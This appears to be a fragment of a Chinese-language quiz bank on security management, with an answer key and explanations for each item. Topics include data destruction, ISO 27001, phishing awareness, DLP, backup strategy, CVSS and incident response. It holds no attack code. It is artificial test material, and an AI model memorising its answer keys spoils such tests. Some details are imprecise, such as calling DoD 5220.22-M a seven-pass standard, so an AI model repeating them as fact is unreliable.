）。","o":["直接删除文件即可","含有敏感数据的存储介质须使用多次覆写、消磁或物理粉碎等方式确保数据不可恢复","格式化硬盘足以销毁所有数据","丢弃即可，垃圾回收站会处理"],"a":1,"e":"\u003cb>数据销毁等级：逻辑销毁（格式化/删除，可恢复）→ 软件覆写（DoD 5220.22-M标准7次覆写）→ 消磁（针对磁介质）→ 物理销毁（粉碎/焚烧，最高安全等级）\u003c/b>。含敏感信息的介质在转储、报废、维修前必须彻底销毁，并留存销毁记录。"},{"c":"mgmt","t":"s","q":"ISO 27001中“内部审核”的频率要求是（　）。","o":["仅在初次认证时","至少每年一次（两次审核间隔不超过12个月）","不需要审核","每五年一次"],"a":1,"e":"\u003cb>ISO 27001条款9.2要求组织至少每年进行一次内部审核\u003c/b>（两次审核间隔不超过12个月），审核ISMS各要素是否符合标准要求和组织自身规定。内部审核是管理评审的输入之一，也是外部认证审核前的自查。审核员应保持独立性（不审核自己的工作）。"},{"c":"mgmt","t":"s","q":"社会工程学攻击中最常用的手法是（　）。","o":["暴力破解密码","钓鱼攻击（Phishing），伪装成可信方诱骗受害者泄露信息或执行操作","DDoS攻击","SQL注入"],"a":1,"e":"\u003cb>社会工程学攻击利用人的心理弱点（信任、好奇、恐惧、贪婪、权威）而非技术漏洞\u003c/b>。常见手法：钓鱼邮件/短信、电话诈骗、假冒IT支持、尾随进门、USB投递等。约91%的网络攻击以钓鱼邮件为入口。防范：培训+技术（邮件网关过滤+URL沙箱）+流程验证。"},{"c":"mgmt","t":"f","q":"零信任架构意味着完全不使用防火墙和VPN等传统安全设备。","a":1,"e":"错误。零信任不是抛弃传统安全设备，而是在传统安全基础上增加以身份为中心的动态访问控制。防火墙、VPN、IAM、EDR等都是零信任架构的组成部分，只是策略从“内网=安全”变为“每次访问都需验证”。零信任是安全理念的演进，不是推倒重来。"},{"c":"mgmt","t":"f","q":"安全管理制度一旦制定完成就不需要再修改和更新。","a":1,"e":"错误。安全管理制度应定期评审（至少每年一次）并根据以下情况及时更新：法律法规变化、组织架构调整、业务变更、安全事件经验教训、新技术新威胁出现、等保/ISO审核发现的不符合项。过期的制度等于没有制度。"},{"c":"mgmt","t":"s","q":"根据《数据安全法》思路，数据分级中'核心数据'的特征是（　）。","o":["对国家安全、国民经济命脉、重要民生、重大公共利益产生重大危害","只影响个人","无影响","仅影响企业营收"],"a":0,"e":"\u003cb>数据分级：\u003cb>核心数据\u003c/b>（危害国家安全/国民经济命脉/重要民生/重大公共利益）、\u003cb>重要数据\u003c/b>（危害国家安全/公共利益但程度较轻）、\u003cb>一般数据\u003c/b>（影响个人/组织权益）\u003c/b>；分级决定保护强度与出境管控。\u003cb>易错点\u003c/b>：'核心>重要>一般'是保护优先级。\u003cb>记忆\u003c/b>：'核心=国计民生级，重要=公共利益级，一般=普通'。"},{"c":"mgmt","t":"s","q":"数据生命周期安全管理中，'数据销毁'环节的正确做法是（　）。","o":["对存储介质进行物理销毁/安全擦除（多次覆写/消磁/加密销毁），并留存销毁记录","直接delete命令","删除回收站","格式化一次即可"],"a":0,"e":"\u003cb>数据销毁：\u003cb>对敏感数据采用安全擦除（多次覆写）、加密后销毁密钥、物理销毁（碎纸/消磁）等手段并留存销毁记录\u003c/b>；简单delete/格式化可被恢复，不达标准\u003c/b>。\u003cb>易错点\u003c/b>：'SSD覆写/格式化≠可靠销毁，用Secure Erase/物理销毁'。\u003cb>记忆\u003c/b>：'销毁要'物理级'，还得留台账'。"},{"c":"mgmt","t":"s","q":"DLP（数据防泄漏）技术中，'基于内容识别'的检测依据通常是（　）。","o":["关键字、正则、数据指纹、文件类型等多维度特征","文件大小","文件数量","存储位置"],"a":0,"e":"\u003cb>DLP内容识别：\u003cb>关键字/正则（身份证号、银行卡）、数据指纹（精确/模糊指纹匹配）、文件类型、结构化数据规则（数据库字段）\u003c/b>识别敏感数据并阻断外发\u003c/b>。\u003cb>易错点\u003c/b>：'指纹+关键字+上下文'组合提升准确率。\u003cb>记忆\u003c/b>：'识别靠关键字、正则、指纹三件套'。"},{"c":"mgmt","t":"s","q":"数据脱敏（数据遮蔽）在开发测试环境中的作用是（　）。","o":["用不可逆/规则化数据替换真实敏感数据，防止测试环境泄露","提高测试速度","节省磁盘","美化界面"],"a":0,"e":"\u003cb>数据脱敏把真实敏感数据替换为\u003cb>规则化/不可逆的仿造数据\u003c/b>（姓名、手机号打码或替换），开发测试环境可安全使用，避免生产数据外泄\u003c/b>。\u003cb>易错点\u003c/b>：'脱敏后的数据不可还原为真实值（区别于加密）'。\u003cb>记忆\u003c/b>：'测试环境用'假数据'，真金白银不上测试场'。"},{"c":"mgmt","t":"s","q":"备份策略中，'差异备份'与'增量备份'的区别是（　）。","o":["差异备份=备份自上次全量以来所有变化；增量备份=备份自上次任意备份以来变化","没有区别","差异备份更快","增量备份占用最大"],"a":0,"e":"\u003cb>差异备份：\u003cb>从上一次全量备份之后的所有变化\u003c/b>都备份（恢复只需全量+最后一次差异，恢复快、占用中等）；增量备份：\u003cb>从上一次备份（全量或增量）之后的变化\u003c/b>备份（占用最小、备份最快，但恢复需全量+所有增量，链长易断）\u003c/b>。\u003cb>记忆\u003c/b>：'差异对全量负责，增量对上一次负责'。"},{"c":"mgmt","t":"s","q":"容灾指标中，RPO（恢复点目标）表示（　）。","o":["可容忍的最大数据丢失量（最近备份点与故障点的时间差）","恢复系统的时间","故障排查时间","演练次数"],"a":0,"e":"\u003cb>RPO=Recovery Point Objective：\u003cb>灾难时允许丢失的数据量/时间差\u003c/b>（如RPO=15分钟即最多丢15分钟数据）；RTO=Recovery Time Objective：\u003cb>恢复业务所需时间\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'RPO丢数据，RTO耗时间'。\u003cb>记忆\u003c/b>：'RPO=点（数据点），RTO=时间（时长）'。"},{"c":"mgmt","t":"s","q":"灾备架构中，'双活（Active-Active）数据中心'的特点是（　）。","o":["两个中心同时对外提供服务、互为灾备，故障时无缝切换","只有一个中心","备中心平时不用","需要人工切换"],"a":0,"e":"\u003cb>双活：\u003cb>两个数据中心同时承载业务\u003c/b>，实时同步数据，单点故障时另一中心继续服务（RPO≈0、RTO极短）；主备模式备中心平时闲置、切换较慢\u003c/b>。\u003cb>易错点\u003c/b>：'双活=都在干活，主备=一个干一个歇'。\u003cb>记忆\u003c/b>：'双活=双子塔都亮灯，主备=备用塔在待命'。"},{"c":"mgmt","t":"s","q":"3-2-1备份原则的含义是（　）。","o":["至少3份数据、2种不同介质、1份异地（离线）存放","3份全在本地","2份就够了","1份数据3个副本"],"a":0,"e":"\u003cb>3-2-1：\u003cb>至少3份数据副本（原件+2备份）、存储在2种不同介质、其中1份异地/离线\u003c/b>，抵御单点故障、介质损坏与勒索（本地备份也会被加密，异地离线备份才保命）\u003c/b>。\u003cb>易错点\u003c/b>：'异地离线备份是抗勒索关键'。\u003cb>记忆\u003c/b>：'三份、两介质、一异地'。"},{"c":"mgmt","t":"s","q":"CVSS（通用漏洞评分系统）3.x的分数范围为（　）。","o":["0.0～10.0，≥9.0为严重（Critical）","0～100","1～5","只有0和1"],"a":0,"e":"\u003cb>CVSS v3评分0.0～10.0：\u003cb>0.1-3.9低、4.0-6.9中、7.0-8.9高、9.0-10.0严重\u003c/b>；综合攻击向量、利用复杂度、影响（机密性/完整性/可用性）等指标\u003c/b>。\u003cb>易错点\u003c/b>：'CVSS是通用评分，修复优先级还要结合业务环境（EPSS/资产重要性）'。\u003cb>记忆\u003c/b>：'9分以上=火烧眉毛（严重）'。"},{"c":"mgmt","t":"s","q":"风险管理中，'残余风险（Residual Risk）'是指（　）。","o":["采取控制措施后仍存在的风险，需由管理层接受或持续监控","未评估的风险","已被消除的风险","初始风险"],"a":0,"e":"\u003cb>残余风险=\u003cb>实施安全措施后仍剩余的风险\u003c/b>；风险管理要求残余风险\u003cb>降至可接受水平\u003c/b>（由管理层决策接受）或继续投入控制\u003c/b>。\u003cb>易错点\u003c/b>：'风险不可能归零，管理的是'可接受''。\u003cb>记忆\u003c/b>：'措施消除一部分，剩下的残余要'认领'或再控'。"},{"c":"mgmt","t":"s","q":"资产管理中，CMDB（配置管理数据库）的核心作用是（　）。","o":["集中记录IT资产与配置项（CI）及其关联关系，支撑变更影响分析与安全资产管理","只记录IP","删除资产","加密数据"],"a":0,"e":"\u003cb>CMDB维护\u003cb>资产/配置项（硬件、软件、服务、人员）及其关系\u003c/b>，用于变更影响分析、故障定位与\u003cb>安全资产管理\u003c/b>（知道有哪些资产才谈得上保护）\u003c/b>。\u003cb>易错点\u003c/b>：'没有资产清单=安全与合规都无从谈起'。\u003cb>记忆\u003c/b>：'CMDB=IT资产的'户口本+家谱''。"},{"c":"mgmt","t":"s","q":"变更管理（Change Management）流程中，对安全敏感变更的额外要求是（　）。","o":["变更需审批、评估安全影响、设置回退方案并在窗口执行后验证","无需审批","直接执行","变更后不留记录"],"a":0,"e":"\u003cb>变更管理：\u003cb>变更申请→影响评估（含安全影响）→审批→窗口实施→回退预案→验证→记录\u003c/b>；安全相关变更（防火墙规则、账号权限、关键配置）需额外审批与审计\u003c/b>。\u003cb>易错点\u003c/b>：'不受控变更=安全事件与故障的温床'。\u003cb>记忆\u003c/b>：'先审批、再实施、留后路、记台账'。"},{"c":"mgmt","t":"s","q":"补丁管理（Patch Management）流程的正确顺序是（　）。","o":["资产盘点→补丁评估（漏洞影响/兼容性）→测试环境验证→分批部署→复测与报告","直接全量部署","跳过测试","只打急补丁"],"a":0,"e":"\u003cb>补丁管理闭环：\u003cb>盘点资产→评估（CVE/CVSS/业务影响）→测试环境验证兼容性→按风险分批部署→复测验证→跟踪报告\u003c/b>；关键补丁（如漏洞利用在野）需加速，但生产环境应评估回退风险\u003c/b>。\u003cb>易错点\u003c/b>：'打补丁前先测试，防止补丁本身导致故障'。\u003cb>记忆\u003c/b>：'盘、评、测、分、验、报六步走'。"},{"c":"mgmt","t":"s","q":"安全运维中，'基线核查'（安全基线检查）的产出通常是（　）。","o":["对照基线的符合项/不符合项清单及整改建议","漏洞列表","流量报表","审计报告"],"a":0,"e":"\u003cb>基线核查对照\u003cb>安全基线（账号口令、审核、权限、服务端口、补丁等标准）\u003c/b>逐项检查，输出\u003cb>符合/不符合清单与整改建议\u003c/b>，驱动加固落地\u003c/b>。\u003cb>易错点\u003c/b>：'基线是'应该怎样'，核查是'现在怎样'，差异即整改点'。\u003cb>记忆\u003c/b>：'对照标准体检，出不达标清单再整改'。"},{"c":"mgmt","t":"s","q":"安全意识培训与钓鱼演练的核心目的（　）。","o":["提升员工识别与应对钓鱼/社工的能力，降低'人的漏洞'","替代技术防护","惩罚员工","节省预算"],"a":0,"e":"\u003cb>安全意识培训+钓鱼演练：\u003cb>让员工能识别钓鱼邮件、不明链接、社工话术并会报告\u003c/b>，把'人'这个最薄弱环节变成防线；演练数据用于针对性再教育\u003c/b>。\u003cb>易错点\u003c/b>：'人是安全的第一道也是最后一道防线'。\u003cb>记忆\u003c/b>：'人防要练，钓鱼要演，中招率就是KPI'。"},{"c":"mgmt","t":"s","q":"安全事件分级（如重大/较大/一般）的主要依据通常是（　）。","o":["影响范围、数据敏感度、业务影响、恢复难度与法律后果","事件数量","员工心情","新闻热度"],"a":0,"e":"\u003cb>事件分级依据：\u003cb>影响范围（系统/数据/业务）、敏感度、业务中断程度、恢复时间、是否涉个人信息/关基、法律合规后果\u003c/b>；分级决定响应级别与上报时限\u003c/b>。\u003cb>易错点\u003c/b>：'分级不同，处置与上报要求不同'。\u003cb>记忆\u003c/b>：'影响+敏感+业务+法律，四维定级'。"},{"c":"mgmt","t":"s","q":"业务连续性管理（BCM）与应急响应的关系是（　）。","o":["应急响应处理'当下事件'，业务连续性关注'业务持续可用'（预案、备份、容灾、演练）","两者无关","应急响应替代BCM","BCM只做文档"],"a":0,"e":"\u003cb>应急响应=事件发生时的\u003cb>快速遏制与恢复\u003c/b>；业务连续性（BCM）=通过\u003cb>预案、备份容灾、冗余、演练\u003c/b>保障业务在灾难下持续，两者配合：应急处理事件，BCM保障可持续\u003c/b>。\u003cb>易错点\u003c/b>：'BCM是持续性保障，应急是即时处置'。\u003cb>记忆\u003c/b>：'应急=灭火，BCM=提前铺好逃生与重启通道'。"},{"c":"mgmt","t":"s","q":"供应商/第三方安全管理的主要内容是（　）。","o":["对供应商进行安全评估、合同约定安全责任、限制其访问范围并定期复核","无要求","完全信任供应商","供应商无需审计"],"a":0,"e":"\u003cb>第三方安全：\u003cb>准入评估（资质/安全能力）、合同约定安全条款（数据保护、保密、责任）、最小化访问授权、定期审计复核、退出时收回权限与数据\u003c/b>；供应链攻击频发，第三方是重要风险源\u003c/b>。\u003cb>易错点\u003c/b>：'供应链环节失守=连坐风险'。\u003cb>记忆\u003c/b>：'进来要评估、合作定条款、权限给最小、退出要收尾'。"},{"c":"mgmt","t":"s","q":"安全KPI/度量指标中，'平均检测时间（MTTD）'与'平均响应时间（MTTR）'的意义是（　）。","o":["MTTD=发现威胁耗时，MTTR=处置威胁耗时；两者越短安全运营越高效","MTTD越大越好","没有意义","只统计攻击次数"],"a":0,"e":"\u003cb>MTTD（Mean Time to Detect）\u003cb>检测\u003c/b>到威胁的耗时，MTTR（Mean Time to Respond/Recover）\u003cb>响应处置\u003c/b>耗时；安全运营目标=缩短两者，让威胁'发现早、处置快'\u003c/b>。\u003cb>易错点\u003c/b>：'检测与响应速度是运营能力核心指标'。\u003cb>记忆\u003c/b>：'发现得快（MTTD），收拾得快（MTTR）'。"},{"c":"mgmt","t":"s","q":"数据资产分类的常见维度不包括（　）。","o":["数据所属员工星座","数据敏感级别（公开/内部/机密/绝密）","数据保存期限","数据责任人"],"a":0,"e":"\u003cb>数据分类维度：\u003cb>敏感级别、业务类别、保存期限、责任主体（数据责任人）、合规要求\u003c/b>等；'星座'等无关属性不属于安全分类维度\u003c/b>。\u003cb>易错点\u003c/b>：'分类分级要服务于'怎么保护、谁负责、留多久''。\u003cb>记忆\u003c/b>：'级别、归属、期限、责任人是核心维度'。"},{"c":"mgmt","t":"s","q":"特权账号（管理员/root/服务账号）的安全管理措施是（　）。","o":["统一纳入PAM管理：最小授权、双人复核、动态口令、定期轮换、操作审计","所有系统共用一个root密码","口令写纸上","长期不轮换"],"a":0,"e":"\u003cb>特权账号管理：\u003cb>统一托管（PAM）、最小授权、关键操作双人复核、动态/一次性口令、定期轮换、全量操作审计\u003c/b>，杜绝'共享root密码'\u003c/b>。\u003cb>易错点\u003c/b>：'特权账号泄露=最高权限沦陷'。\u003cb>记忆\u003c/b>：'特权账号上锁+换锁+留痕，杜绝一码多机'。"},{"c":"mgmt","t":"s","q":"安全事件发生后，'复盘（事后总结）'阶段的核心任务是（　）。","o":["分析根因、总结经验教训、输出改进措施并落实跟踪","立即删日志","追责了事","恢复到原样"],"a":0,"e":"\u003cb>复盘（Lessons Learned）：\u003cb>根因分析、过程复盘、识别管理/技术短板、输出可执行改进措施并跟踪落地\u003c/b>，让每起事件都转化为安全能力提升\u003c/b>。\u003cb>易错点\u003c/b>：'不改进的复盘=走形式'。\u003cb>记忆\u003c/b>：'出了事要长记性，整改要闭环'。"},{"c":"mgmt","t":"s","q":"日志管理平台（集中日志）在安全管理中的价值是（　）。","o":["统一收集留存多源日志，支撑合规、审计、溯源与关联分析","替代杀毒","只存不查","仅用于排错"],"a":0,"e":"\u003cb>集中日志管理：\u003cb>统一收集（Syslog/Agent）、统一格式、统一留存（≥6个月）、统一检索与告警\u003c/b>，是合规审计与事件溯源的基础设施（常为SIEM底座）\u003c/b>。\u003cb>易错点\u003c/b>：'日志不集中=溯源无门'。\u003cb>记忆\u003c/b>：'所有日志进一个池子，找事才有据可查'。"},{"c":"mgmt","t":"s","q":"远程办公场景的安全要求通常包括（　）。","o":["通过VPN接入、强制MFA、终端合规（杀软/补丁/加密盘）、数据不外带","随意直连公网","不加密","共享账号"],"a":0,"e":"\u003cb>远程办公安全：\u003cb>VPN/零信任接入+多因素认证+终端安全合规（EDR/补丁/磁盘加密）+数据外发管控+可审计\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'远程入口多，认证与终端管控是重点'。\u003cb>记忆\u003c/b>：'加密隧道进、双因素进门、终端先体检'。"},{"c":"mgmt","t":"s","q":"风险评估流程的标准步骤是（　）。","o":["资产识别→威胁识别→脆弱性识别→风险计算与定级→处置决策","直接买保险","只识别资产","跳过计算"],"a":0,"e":"\u003cb>风险评估（如ISO 27005/GB/T 20984）：\u003cb>资产识别→威胁识别→脆弱性识别→风险计算（可能性×影响）→风险定级→处置（降低/转移/规避/接受）→残余风险监控\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'评估是'资产-威胁-脆弱性'三要素的系统分析'。\u003cb>记忆\u003c/b>：'资产+威胁+弱点→风险→处置→残留'。"},{"c":"mgmt","t":"s","q":"关于'纵深防御（Defense in Depth）'，下列说法正确的是（　）。","o":["多层、多种防护措施叠加，单层失效仍有后续防线","只靠防火墙","只靠杀毒","物理隔离即可"],"a":0,"e":"\u003cb>纵深防御=\u003cb>在网络、主机、应用、数据、人员多层面部署多种互补的防护（防火墙/IDS/EDR/WAF/加密/审计/培训）\u003c/b>，避免单点依赖\u003c/b>。\u003cb>易错点\u003c/b>：'洋葱式防护，剥一层还有一层'。\u003cb>记忆\u003c/b>：'防线层层叠，攻破一层还有下一层'。"},{"c":"mgmt","t":"s","q":"ISO/IEC 27001信息安全管理体系（ISMS）的核心是（　）。","o":["建立'规划-实施-检查-改进（PDCA）'循环的风险驱动安全管理体系","只做一份制度文档","只看技术设备","一劳永逸"],"a":0,"e":"\u003cb>ISO 27001：以\u003cb>风险评估\u003c/b>为基础建立ISMS，通过\u003cb>PDCA（Plan-Do-Check-Act）\u003c/b>持续改进安全管理（策略、组织、资产、人员、物理、技术、合规等控制域），并接受认证审核\u003c/b>。\u003cb>易错点\u003c/b>：'27001是管理体系建设，不是技术清单'。\u003cb>记忆\u003c/b>：'风险管理+PDCA循环+持续改进'。"},{"c":"mgmt","t":"s","q":"数据备份中，验证备份可用性的正确做法是（　）。","o":["定期进行恢复演练（模拟恢复/验证可读性）","只备份不验证","备份到同一台机器","从不清洗"],"a":0,"e":"\u003cb>备份要\u003cb>定期演练恢复\u003c/b>：只有'能恢复'的备份才叫备份，定期从备份恢复验证数据完整与可用，并检查异地/离线副本\u003c/b>。\u003cb>易错点\u003c/b>：'备份失效=灾难时才发现'，勒索事件最痛悔的点。\u003cb>记忆\u003c/b>：'备份不是存的，是'验'出来的'。"},{"c":"mgmt","t":"s","q":"安全运营中心（SOC）日常'安全运营'的核心闭环是（　）。","o":["监测→告警→研判→响应处置→复盘改进的持续循环","只做日志备份","只处理工单","只更新规则库"],"a":0,"e":"\u003cb>安全运营闭环：\u003cb>持续监测（日志/流量/EDR）→告警→研判分级→响应处置（遏制/取证/修复）→复盘改进（优化规则与流程）\u003c/b>，并配套威胁情报与日常巡检\u003c/b>。\u003cb>易错点\u003c/b>：'运营是'闭环+持续'，不是单点告警'。\u003cb>记忆\u003c/b>：'监测-研判-处置-复盘，转起来才算运营'。"},{"c":"mgmt","t":"s","q":"数据泄露响应中，'告知义务'的通常要求是（　）。","o":["发生可能造成损害的数据泄露时，及时通知相关个人并按规定报告主管部门","无需告知","只在年终报告","只通知媒体"],"a":0,"e":"\u003cb>《数据安全法》《个人信息保护法》要求：发生数据/个人信息泄露可能造成危害时，\u003cb>及时采取补救措施并通知个人、按规定报告主管部门\u003c/b>（部分行业有具体时限，如电信领域24小时）\u003c/b>。\u003cb>易错点\u003c/b>：'泄露=必告知、必报告'。\u003cb>记忆\u003c/b>：'出事就补救、告知个人、上报监管'。"},{"c":"mgmt","t":"m","q":"下列属于数据脱敏常见方法的有（　）。","o":["数据掩码（如手机号 138****5678）","数据替换/假名化","数据加密","数据泛化（如精确年龄改为区间）"],"a":[0,1,2,3],"e":"\u003cb>掩码、替换/假名化、加密、泛化\u003c/b>都是常用脱敏手段，目的是在保留数据可用性的同时，消除敏感数据与真实身份的关联，多用于测试、分析与对外共享场景。"}];
